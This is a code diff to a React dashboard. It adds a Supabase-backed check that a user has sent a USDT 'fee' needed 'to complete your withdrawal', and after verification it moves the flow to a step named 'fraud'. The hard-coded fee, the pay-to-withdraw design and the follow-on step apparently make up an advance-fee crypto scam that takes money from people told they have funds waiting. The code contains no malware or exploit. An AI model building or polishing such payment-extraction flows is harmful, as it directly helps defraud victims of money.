@@ -1,5 +1,6 @@
 import { useState, useMemo } from "react";
-import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, Copy, Check, PartyPopper } from "lucide-react";
+import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, Copy, Check, PartyPopper, Loader2, RefreshCw } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -203,8 +204,49 @@ const Dashboard = () => {
     setCashoutStep("payment");
   };
 
+  const [isVerifying, setIsVerifying] = useState(false);
+  const [verificationError, setVerificationError] = useState<string | null>(null);
+
+  const verifyPayment = async () => {
+    setIsVerifying(true);
+    setVerificationError(null);
+    
+    const amountDue = fee - 101; // $96.52
+    
+    try {
+      console.log(`Verifying payment of $${amountDue.toFixed(2)} USDT...`);
+      
+      const { data, error } = await supabase.functions.invoke('verify-payment', {
+        body: { 
+          minAmount: amountDue,
+          timeWindowMinutes: 60 
+        }
+      });
+
+      console.log('Verification response:', data);
+
+      if (error) {
+        console.error('Verification error:', error);
+        setVerificationError('Failed to connect to verification service. Please try again.');
+        return;
+      }
+
+      if (data.verified) {
+        console.log('✅ Payment verified!', data.transaction);
+        setCashoutStep("fraud");
+      } else {
+        setVerificationError(data.message || 'Payment not found. Please ensure you sent the correct amount.');
+      }
+    } catch (err) {
+      console.error('Payment verification failed:', err);
+      setVerificationError('Verification service unavailable. Please try again later.');
+    } finally {
+      setIsVerifying(false);
+    }
+  };
+
   const handlePaymentConfirmed = () => {
-    setCashoutStep("fraud");
+    verifyPayment();
   };
 
   const copyAddress = () => {
@@ -594,11 +636,30 @@ const Dashboard = () => {
                 <p className="text-xs text-muted-foreground">Send ${remainingFee.toFixed(2)} USDT to complete your withdrawal</p>
               </div>
 
+              {verificationError && (
+                <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-3 text-sm text-destructive">
+                  {verificationError}
+                </div>
+              )}
+
               <Button
                 onClick={handlePaymentConfirmed}
+                disabled={isVerifying}
                 className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
               >
-                <CheckCircle className="w-4 h-4 mr-2" /> Mark I Have Paid
+                {isVerifying ? (
+                  <>
+                    <Loader2 className="w-4 h-4 mr-2 animate-spin" /> Verifying Payment...
+                  </>
+                ) : verificationError ? (
+                  <>
+                    <RefreshCw className="w-4 h-4 mr-2" /> Verify Again
+                  </>
+                ) : (
+                  <>
+                    <CheckCircle className="w-4 h-4 mr-2" /> Verify Payment
+                  </>
+                )}
               </Button>
             </div>
           </>
